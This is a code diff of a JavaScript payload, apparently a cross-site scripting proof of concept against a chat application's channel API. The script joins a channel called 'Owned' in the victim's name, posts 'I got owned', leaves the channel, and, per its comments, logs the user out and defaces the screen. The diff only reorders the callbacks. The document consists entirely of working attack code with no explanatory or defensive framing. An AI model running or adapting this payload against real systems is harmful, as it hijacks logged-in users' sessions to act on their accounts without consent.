@@ -12,20 +12,22 @@ document.head.appendChild(jquery);
 // Next, lets add ourselves to the channel "Owned"
 // POST /api/v1/channels/hash/join
 $.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/join', function(data, status){
-	// lets say we were owned in this channel
-	var data = {
-		"filenames": [],
-		"message": "I got owned",
-		"channel_id": "gtichcgad3b4idix8tdsgdr5qh",
-		"pending_post_id": "",
-		"user_id": "",
-		"create_at":1,
-		"state":"loading"
-	};
-	$.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/create', JSON.stringify(data), function(retData,status){
-		$.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/leave', function(data, status){
-		});
-	});
 })
+
+// lets say we were owned in this channel
+var data = {
+	"filenames": [],
+	"message": "I got owned",
+	"channel_id": "gtichcgad3b4idix8tdsgdr5qh",
+	"pending_post_id": "",
+	"user_id": "",
+	"create_at":1,
+	"state":"loading"
+};
+$.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/create', JSON.stringify(data), function(retData,status){		
+});
+
+$.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/leave', function(data, status){
+});
 
 // Finally, lets log ourselves out, fade the screen to white, and write "Owned"
